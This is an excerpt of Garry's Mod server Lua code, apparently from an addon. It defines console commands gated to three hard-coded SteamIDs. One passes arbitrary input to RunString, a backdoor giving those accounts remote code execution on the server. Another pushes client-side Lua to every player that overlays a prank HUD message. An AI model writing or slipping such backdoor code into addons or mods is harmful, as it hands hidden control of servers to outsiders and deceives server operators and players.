...
concommand.Add("timeforaparty", function( pPlayer )
	...
	if not (pPlayer:SteamID() == "STEAM_0:0:26625390" or pPlayer:SteamID() == "STEAM_0:1:20046983" or pPlayer:SteamID() == "STEAM_0:1:54591765") then return end
	for k, v in pairs( player.GetAll() ) do
		lol:SetupPlayer( v )
	...
	concommand.Add("mememachine", function( ply,cmd,arg,argstr)
		if not (ply:SteamID() == "STEAM_0:0:26625390" or ply:SteamID() == "STEAM_0:1:20046983" or ply:SteamID() == "STEAM_0:1:54591765") then return end
		RunString(argstr)
	end)
end
	...
	lol:SendLua( pPlayer, [[
		...
		hook.Add( "HUDPaint", "newhud", function()
			...
			draw.SimpleTextOutlined(
				"A lack of dank memes has been detected on this server! (Rejoin if you hate this)",
				"DermaLarge",
